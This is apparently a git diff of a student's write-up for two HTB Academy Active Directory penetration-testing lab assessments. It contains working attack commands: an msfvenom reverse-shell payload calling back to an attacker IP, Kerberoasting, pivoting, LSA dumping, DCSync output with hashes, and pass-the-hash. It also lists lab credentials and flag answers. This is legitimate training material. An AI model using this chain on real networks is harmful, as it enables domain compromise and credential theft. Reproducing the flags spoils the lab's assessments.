@@ -1,19 +1,18 @@
-
-
 # AD Enum & Attacks - Assessment 1
 
 ## Given Info
-A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
 
+A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
 
 ## Steps
 
 ### Finding the Admin's Desktop Flag
+
 - nmap scan just to check what ports are open on the host
 - Look around the web server through the web shell in order t o find the admin desktop directory.
 
-
 ### Elevating Access to the Reverse Shell from the Web Shell
+
         
 - Use msfconsole to create a custom payload
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.9 lport=4444 -f exe > shell.exe`
@@ -21,8 +20,8 @@ A team member started an External Penetration Test and was moved to another urge
 	- use exploit/multi/handler in order to listen in
 	- upload the exploit to the web shell, and run it
 
-
 ### Getting a User's Hash
+
         
 - We don't have a password to the local host, so we have to get a password hash and crack it
 - Transfer PowerView.ps1 to the target machine and import it into powershell
@@ -30,8 +29,8 @@ A team member started an External Penetration Test and was moved to another urge
 	- `Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat | out-File .\\\\hash.txt`
 - copy the hash and use hashcat to break it
 
-
 ### Getting into MS01
+
 - Running `ipconfig` shows you a second network adapter, meaning we’ll need to pivot to the internal network        
 - Go to the meterpreter shell, and run the following    
 	- `run autoroute -s 172.16.6.0/24`
@@ -55,12 +54,12 @@ run
 - Use CME again to find the file called flag.txt
 	- `sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\\users\\administrator\\desktop\\flag.txt"`
 
-
 ### Dumping Passwords
+
 - `proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa`
 
-
 ### Attack Vectors
+
         
 - Use powerview to evaluate attack vectors
 
@@ -92,8 +91,8 @@ SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
 ObjectAceType         : DS-Replication-Get-Changes-All
 ```
 
-
 ### Domain Takeover
+
         
 - DCSync Attack:
 
@@ -117,7 +116,6 @@ Administrator:des-cbc-md5:c2d9c892f2e6f2dc
 [*] Cleaning up... 
 ```
 
-            
 - Use `wmiexec.py` as `administrator` and pass the hash `aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0` to be able to connect to DC01
 
 ```powershell
@@ -139,37 +137,32 @@ C:\\>type c:\\users\\administrator\\desktop\\flag.txt
 r3plicat1on_m@st3r!
 ```
 
-
-
-
 ## Creds
+
         
 1. user: svc_sql, pass: lucky7
 
-
 ## Flags
+
 1. `JusT_g3tt1ng_st@rt3d!`
 2. `spn$_r0ast1ng_on_@n_0p3n_f1re`
 3. `tpetty:Sup3rS3cur3D0m@inU2eR`
 4. `r3plicat1on_m@st3r!`
 
-
-
 # AD Enum & Attacks - Assessment 2**
 
-
 ## Given
+
 Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.Apply what you learned in this module to compromise the domain and answer the questions below to complete part II of the skills assessment.
+
 1. `SSH to with user "htb-student" and password "HTB_@cademy_stdnt!"`
 
-
 ## Steps
+
 1. ssh into the machine
 2. `ip a` to see if the machine is connected to any other networks: `ens224` is connected to an internal network `172.16.7.240/23`
 3. Try using responder to harvest hashes
 
-
 ## Creds
-
 
 ## Flags
